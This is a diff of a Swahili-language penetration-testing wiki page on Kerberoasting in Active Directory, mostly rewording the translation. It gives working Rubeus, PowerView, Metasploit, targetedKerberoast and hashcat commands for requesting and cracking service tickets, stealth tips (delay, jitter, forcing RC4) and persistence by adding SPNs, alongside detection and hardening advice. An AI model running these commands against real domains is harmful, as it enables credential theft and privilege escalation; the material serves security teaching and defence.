@@ -4,38 +4,38 @@
 
 ## Kerberoast
 
-Kerberoasting hulenga kupata tiketi za TGS, hasa zile zinazohusiana na services zinazoendesha chini ya user accounts katika Active Directory (AD), bila kujumuisha computer accounts. Usimbaji wa tiketi hizi hutumia keys zinazotokana na user passwords, hivyo kuruhusu offline credential cracking. Matumizi ya user account kama service yanaonyeshwa na property ya ServicePrincipalName (SPN) isiyo tupu.
+Kerberoasting inalenga upatikanaji wa tiketi za TGS, hasa zile zinazohusiana na huduma zinazoendesha chini ya user accounts katika Active Directory (AD), bila kujumuisha computer accounts. Usimbaji fiche wa tiketi hizi hutumia keys zinazotokana na user passwords, hivyo kuruhusu credential cracking ya offline. Matumizi ya user account kama huduma huonyeshwa na property ya ServicePrincipalName (SPN) isiyo tupu.
 
 Mtumiaji yeyote wa domain aliye authenticated anaweza kuomba tiketi za TGS, kwa hiyo hakuna privileges maalum zinazohitajika.<sup>[[4]](#references)[[5]](#references)</sup>
 
 ### Hoja Muhimu
 
-- Hulenga tiketi za TGS za services zinazoendesha chini ya user accounts (yaani, accounts zilizo na SPN iliyowekwa; si computer accounts).
+- Huwalenga tiketi za TGS za huduma zinazoendesha chini ya user accounts (yaani, accounts zilizo na SPN iliyowekwa; si computer accounts).
 - Tiketi husimbwa kwa key inayotokana na password ya service account na zinaweza kuvunjwa offline.
 - Hakuna elevated privileges zinazohitajika; account yoyote iliyo authenticated inaweza kuomba tiketi za TGS.
 
 > [!WARNING]
-> Tools nyingi za umma hupendelea kuomba service tickets za RC4-HMAC (etype 23) kwa sababu ni rahisi zaidi kuvunja kuliko AES. RC4 TGS hashes huanza na `$krb5tgs$23$*`, AES128 huanza na `$krb5tgs$17$*`, na AES256 huanza na `$krb5tgs$18$*`. Hata hivyo, environments nyingi zinahamia kwenye AES-only. Usidhani kwamba RC4 pekee ndiyo muhimu.
-> Pia, epuka roasting ya “spray-and-pray”. Rubeus’ default kerberoast inaweza ku-query na kuomba tickets kwa SPNs zote na huwa noisy. Enumerate na target principals zinazovutia kwanza.
+> Zana nyingi za public hupendelea kuomba service tickets za RC4-HMAC (etype 23) kwa sababu ni rahisi zaidi ku-crack kuliko AES. RC4 TGS hashes huanza na `$krb5tgs$23$*`, AES128 huanza na `$krb5tgs$17$*`, na AES256 huanza na `$krb5tgs$18$*`. Hata hivyo, environments nyingi zinahamia kwenye AES-only. Usidhani kuwa RC4 pekee ndiyo muhimu.
+> Pia, epuka roasting ya “spray-and-pray”. Kerberoast ya default ya Rubeus inaweza kuuliza na kuomba tickets kwa SPNs zote na husababisha kelele nyingi. Fanya enumeration na ulenga principals zinazovutia kwanza.
 
 ### Siri za service accounts na gharama ya Kerberos crypto
 
-Services nyingi bado zinaendesha chini ya user accounts zenye passwords zinazosimamiwa manually. KDC husimba service tickets kwa keys zinazotokana na passwords hizo na kumpa ciphertext kila principal aliye authenticated, hivyo kerberoasting hutoa unlimited offline guesses bila lockouts au DC telemetry. Encryption mode huamua cracking budget:
+Huduma nyingi bado zinaendesha chini ya user accounts zenye passwords zinazosimamiwa manually. KDC husimba service tickets kwa keys zinazotokana na passwords hizo na kumpa ciphertext principal yeyote aliye authenticated, hivyo kerberoasting hutoa majaribio ya offline yasiyo na kikomo bila lockouts au DC telemetry. Encryption mode huamua cracking budget:
 
-| Mode | Key derivation | Encryption type | Takriban RTX 5090 throughput* | Notes |
+| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
 | --- | --- | --- | --- | --- |
-| AES + PBKDF2 | PBKDF2-HMAC-SHA1 yenye iterations 4,096 na per-principal salt inayotengenezwa kutoka kwa domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt huzuia rainbow tables lakini bado huruhusu cracking ya haraka ya passwords fupi. |
-| RC4 + NT hash | MD4 moja ya password (unsalted NT hash); Kerberos huchanganya tu confounder ya bytes 8 kwa kila ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× haraka kuliko AES; attackers hulazimisha RC4 kila `msDS-SupportedEncryptionTypes` inapoiruhusu. |
+| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blocks rainbow tables but still allows fast cracking of short passwords. |
+| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× faster than AES; attackers force RC4 whenever `msDS-SupportedEncryptionTypes` permits it. |
 
-*Benchmarks kutoka kwa Chick3nman kama ilivyoelezwa katika [uchambuzi wa Kerberoasting wa Matthew Green](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>
+*Benchmarks from Chick3nman as cited in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>
 
-Confounder ya RC4 hufanya keystream iwe random tu; haiongezi kazi kwa kila guess. Isipokuwa service accounts zitumie secrets za random (gMSA/dMSA, machine accounts, au strings zinazosimamiwa na vault), kasi ya compromise inategemea tu GPU budget. Kulazimisha AES-only etypes huondoa downgrade ya guesses bilioni kwa sekunde, lakini human passwords dhaifu bado hushindwa na PBKDF2.<sup>[[3]](#references)</sup>
+Confounder ya RC4 hubadilisha tu keystream kwa randomness; haiongezi kazi kwa kila guess. Isipokuwa service accounts zitumie secrets za random (gMSA/dMSA, machine accounts, au strings zinazosimamiwa na vault), kasi ya compromise hutegemea tu GPU budget. Kulazimisha AES-only etypes huondoa downgrade ya guesses bilioni kwa sekunde, lakini human passwords dhaifu bado huanguka chini ya PBKDF2.<sup>[[3]](#references)</sup>
 
 ### Attack
 
 #### Linux
 
-Mfano wa practical end-to-end unaotumia NetExec kuomba tickets zinazoweza ku-roast na Hashcat kuzivunja unapatikana katika reference [1].<sup>[[1]](#references)</sup>
+Mfano wa vitendo wa end-to-end unaotumia NetExec kuomba tickets zinazoweza ku-roastiwa na Hashcat kuzi-crack unapatikana katika reference [1].<sup>[[1]](#references)</sup>
 ```bash
 # Metasploit Framework
 msf> use auxiliary/gather/get_user_spns
@@ -56,14 +56,14 @@ kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o ke
 # 2) Request TGS for selected SPNs and dump
 kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
 ```
-Zana zenye vipengele vingi zinazojumuisha ukaguzi wa kerberoast:
+Zana zenye vipengele vingi zikiwemo ukaguzi wa kerberoast:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
 ```
 #### Windows
 
-- Enumerate watumiaji wa kerberoastable
+- Orodhesha watumiaji wa kerberoastable
 ```powershell
 # Built-in
 setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)
@@ -106,19 +106,19 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerbe
 .\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
 ```
 > [!WARNING]
-> Ombi la TGS huzalisha Windows Security Event 4769 (Tiki ya huduma ya Kerberos iliombwa).
+> Ombi la TGS hutengeneza Windows Security Event 4769 (Tiketi ya huduma ya Kerberos iliombwa).
 
 ### OPSEC na mazingira ya AES-only
 
-- Omba RC4 kimakusudi kwa akaunti zisizo na AES:
+- Omba RC4 kwa makusudi kwa akaunti zisizo na AES:
 - Rubeus: `/rc4opsec` hutumia tgtdeleg kuorodhesha akaunti zisizo na AES na kuomba service tickets za RC4.
 - Rubeus: `/tgtdeleg` pamoja na kerberoast pia huanzisha maombi ya RC4 inapowezekana.<sup>[[6]](#references)</sup>
-- Fanya roast ya akaunti za AES-only badala ya kushindwa kimya:
+- Roast akaunti za AES-only badala ya kushindwa kimya:
 - Rubeus: `/aes` huorodhesha akaunti zilizo na AES na kuomba service tickets za AES (etype 17/18).
 - Ikiwa tayari una TGT (PTT au kutoka kwenye .kirbi), unaweza kutumia `/ticket:<blob|path>` pamoja na `/spn:<SPN>` au `/spns:<file>` na kuruka LDAP.
 - Kulenga, kupunguza kasi na kupunguza kelele:
 - Tumia `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` na `/jitter:<1-100>`.
-- Chuja passwords zinazoweza kuwa dhaifu kwa kutumia `/pwdsetbefore:<MM-dd-yyyy>` (password za zamani) au lenga OUs zenye privileged kwa kutumia `/ou:<DN>`.<sup>[[8]](#references)</sup>
+- Chuja kwa passwords zinazowezekana kuwa dhaifu ukitumia `/pwdsetbefore:<MM-dd-yyyy>` (passwords za zamani) au lenga OUs zenye privileges ukitumia `/ou:<DN>`.<sup>[[8]](#references)</sup>
 
 Mifano (Rubeus):
 ```powershell
@@ -144,24 +144,24 @@ hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
 ```
 ### Persistence / Abuse
 
-Ikiwa una udhibiti wa akaunti au unaweza kuirekebisha, unaweza kuifanya iwe kerberoastable kwa kuongeza SPN:
+Ikiwa unadhibiti au unaweza kurekebisha akaunti, unaweza kuifanya iwe kerberoastable kwa kuongeza SPN:
 ```powershell
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
 ```
-Fanya downgrade ya akaunti ili kuwezesha RC4 kwa cracking rahisi (inahitaji write privileges kwenye target object):
+Fanya downgrade ya account ili kuwezesha RC4 kwa cracking rahisi (inahitajika kuwa na write privileges kwenye target object):
 ```powershell
 # Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
 Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
 # Mixed RC4+AES (value 28)
 Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
 ```
-#### Targeted Kerberoast kupitia GenericWrite/GenericAll dhidi ya user (SPN ya muda)
+#### Targeted Kerberoast kupitia GenericWrite/GenericAll kwenye user (SPN ya muda)
 
-BloodHound inapoonyesha kuwa una control juu ya user object (k.m., GenericWrite/GenericAll), unaweza kwa uhakika kufanya “targeted-roast” kwa user huyo mahususi hata kama kwa sasa hana SPNs yoyote:<sup>[[9]](#references)</sup>
+BloodHound inapoonyesha kuwa una control juu ya user object (kwa mfano, GenericWrite/GenericAll), unaweza kwa uhakika kufanya “targeted-roast” user huyo mahususi hata kama kwa sasa hana SPNs yoyote:<sup>[[9]](#references)</sup>
 
-- Ongeza SPN ya muda kwa user unayemiliki ili aweze kuroastishwa.
+- Ongeza SPN ya muda kwenye user unayemdhibiti ili aweze kuroast.
 - Omba TGS-REP iliyosimbwa kwa RC4 (etype 23) kwa SPN hiyo ili kurahisisha cracking.
-- Crack hash ya `$krb5tgs$23$...` kwa hashcat.
+- Crack hash ya `$krb5tgs$23$...` kwa kutumia hashcat.
 - Ondoa SPN ili kupunguza footprint.
 
 Windows (PowerView/Rubeus):
@@ -175,31 +175,31 @@ Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSv
 # Remove SPN afterwards
 Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
 ```
-One-liner ya Linux (targetedKerberoast.py huendesha kiotomatiki add SPN -> request TGS (etype 23) -> remove SPN):<sup>[[2]](#references)</sup>
+Linux one-liner (targetedKerberoast.py huweka SPN -> huomba TGS (etype 23) -> huondoa SPN):<sup>[[2]](#references)</sup>
 ```bash
 targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
 ```
-Crack matokeo kwa hashcat autodetect (mode 13100 kwa `$krb5tgs$23$`):
+Crack output kwa hashcat autodetect (mode 13100 kwa `$krb5tgs$23$`):
 ```bash
 hashcat <outfile>.hash /path/to/rockyou.txt
 ```
-Maelezo ya detection: kuongeza/kuondoa SPN huzalisha mabadiliko kwenye directory (Event ID 5136/4738 kwa user lengwa), na ombi la TGS huzalisha Event ID 4769. Fikiria kuweka throttling na kufanya prompt cleanup.
+Vidokezo vya detection: kuongeza/kutoa SPNs huzalisha mabadiliko ya directory (Event ID 5136/4738 kwenye user lengwa), na TGS request huzalisha Event ID 4769. Fikiria kupunguza kasi ya requests na kufanya prompt cleanup.
 
 Unaweza kupata tools muhimu za mashambulizi ya kerberoast hapa: https://github.com/nidem/kerberoast
 
-Ukiona error hii kutoka Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, imesababishwa na local time skew. Sync na DC:
+Ukikumbana na error hii kutoka Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, inasababishwa na tofauti ya muda wa local. Synchronize na DC:
 
 - `ntpdate <DC_IP>` (deprecated kwenye baadhi ya distros)
 - `rdate -n <DC_IP>`
 
-### Kerberoast bila akaunti ya domain (AS-requested STs)
+### Kerberoast bila domain account (AS-requested STs)
 
-Mnamo Septemba 2022, Charlie Clark alionyesha kwamba ikiwa principal haihitaji pre-authentication, inawezekana kupata service ticket kupitia KRB_AS_REQ iliyoundwa kwa kubadilisha sname kwenye request body, na hivyo kupata service ticket badala ya TGT. Hii inafanana na AS-REP roasting na haihitaji domain credentials halali.
+Mnamo Septemba 2022, Charlie Clark alionyesha kwamba ikiwa principal haihitaji pre-authentication, inawezekana kupata service ticket kupitia KRB_AS_REQ iliyoundwa mahsusi kwa kubadilisha sname katika request body, na hivyo kupata service ticket badala ya TGT. Hii inafanana na AS-REP roasting na haihitaji domain credentials halali.
 
-Angalia maelezo: Semperis write-up “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>
+Tazama maelezo: Semperis write-up “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>
 
 > [!WARNING]
-> Lazima utoe list ya users kwa sababu bila credentials halali huwezi ku-query LDAP kwa kutumia technique hii.
+> Lazima utoe orodha ya users kwa sababu bila credentials halali huwezi ku-query LDAP kwa kutumia technique hii.
 
 Linux
 
@@ -213,9 +213,9 @@ Windows
 ```powershell
 Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
 ```
-Kuhusiana
+Zinazohusiana
 
-Ikiwa unawalenga users wanaoweza kushambuliwa kwa AS-REP roast, tazama pia:
+Ikiwa unalenga watumiaji wanaoweza kufanyiwa AS-REP roast, tazama pia:
 
 {{#ref}}
 asreproast.md
@@ -223,11 +223,11 @@ asreproast.md
 
 ### Utambuzi
 
-Kerberoasting inaweza kuwa stealthy. Tafuta Event ID 4769 kutoka kwa DCs na tumia filters kupunguza noise:
+Kerberoasting inaweza kuwa ya siri. Tafuta Event ID 4769 kutoka kwa DCs na tumia filters kupunguza kelele:
 
-- Ondoa service name `krbtgt` na service names zinazoishia na `$` (computer accounts).
+- Ondoa service name `krbtgt` na service names zinazoishia kwa `$` (computer accounts).
 - Ondoa requests kutoka kwa machine accounts (`*$$@*`).
-- Requests zilizofanikiwa pekee (Failure Code `0x0`).
+- Jumuisha requests zilizofanikiwa pekee (Failure Code `0x0`).
 - Fuatilia encryption types: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Usitoe alert kwa `0x17` pekee.
 
 Mfano wa PowerShell triage:
@@ -244,27 +244,27 @@ Select-Object -ExpandProperty Message
 ```
 Mawazo ya ziada:
 
-- Weka msingi wa matumizi ya kawaida ya SPN kwa kila host/user; toa alert kuhusu ongezeko kubwa la maombi tofauti ya SPN kutoka kwa principal mmoja.
+- Weka baseline ya matumizi ya kawaida ya SPN kwa kila host/user; toa alert kunapokuwa na bursts kubwa za maombi ya SPN tofauti kutoka kwa principal mmoja.
 - Weka alama kwa matumizi yasiyo ya kawaida ya RC4 katika domains zilizoimarishwa kwa AES.
 
 ### Mitigation / Hardening
 
-- Tumia gMSA/dMSA au machine accounts kwa services. Managed accounts zina passwords za random zenye zaidi ya herufi 120 na huzibadilisha kiotomatiki, hivyo kufanya offline cracking isiwe na manufaa.<sup>[[7]](#references)</sup>
-- Lazimisha AES kwenye service accounts kwa kuweka `msDS-SupportedEncryptionTypes` kuwa AES-only (decimal 24 / hex 0x18), kisha ubadilishe password ili AES keys zitengenezwe.<sup>[[7]](#references)</sup>
-- Pale inapowezekana, zima RC4 katika environment yako na ufuatilie majaribio ya kutumia RC4. Kwenye DCs unaweza kutumia registry value ya `DefaultDomainSupportedEncTypes` kuelekeza defaults kwa accounts ambazo `msDS-SupportedEncryptionTypes` haijawekwa. Fanya majaribio ya kina.
+- Tumia gMSA/dMSA au machine accounts kwa services. Managed accounts zina passwords za random zenye urefu wa zaidi ya herufi 120 na huzibadilisha automatically, hivyo offline cracking huwa si ya kivitendo.<sup>[[7]](#references)</sup>
+- Lazimisha AES kwenye service accounts kwa kuweka `msDS-SupportedEncryptionTypes` kuwa AES-only (decimal 24 / hex 0x18), kisha badilisha password ili AES keys zitengenezwe.<sup>[[7]](#references)</sup>
+- Inapowezekana, disable RC4 katika environment yako na monitor majaribio ya kutumia RC4. Kwenye DCs unaweza kutumia registry value ya `DefaultDomainSupportedEncTypes` kuelekeza defaults za accounts ambazo `msDS-SupportedEncryptionTypes` haijawekwa. Fanya majaribio kwa kina.
 - Ondoa SPNs zisizo za lazima kutoka kwenye user accounts.<sup>[[7]](#references)</sup>
-- Tumia passwords ndefu na za random za service accounts (angalau herufi 25) ikiwa managed accounts haziwezekani; kataza passwords za kawaida na fanya audit mara kwa mara.<sup>[[7]](#references)</sup>
+- Tumia passwords ndefu na za random za service accounts (herufi 25+) ikiwa managed accounts haziwezekani; kataza passwords za kawaida na fanya audit mara kwa mara.<sup>[[7]](#references)</sup>
 
 ## References
 
-- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking kwa vitendo](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
+- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
 - [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
-- [3] [Matthew Green – Kerberoasting: Mashambulizi ya gharama ndogo na athari kubwa kutoka kwenye Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
-- [4] [Kerberos (II): Jinsi ya kushambulia Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [3] [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
+- [4] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
-- [6] [ired.team – Kerberoasting: Kuomba TGS iliyosimbwa kwa RC4 wakati AES imewezeshwa](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
-- [7] [Microsoft Security Blog (2024-10-11) – Mwongozo wa Microsoft wa kusaidia kupunguza Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
-- [8] [SpecterOps – Documentation ya command ya Rubeus kerberoast](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
+- [6] [ired.team – Kerberoasting: Requesting RC4 Encrypted TGS when AES is Enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
+- [7] [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
+- [8] [SpecterOps – Rubeus kerberoast command documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
 - [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
 - [10] [Semperis – New Attack Paths? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
 {{#include ../../banners/hacktricks-training.md}}
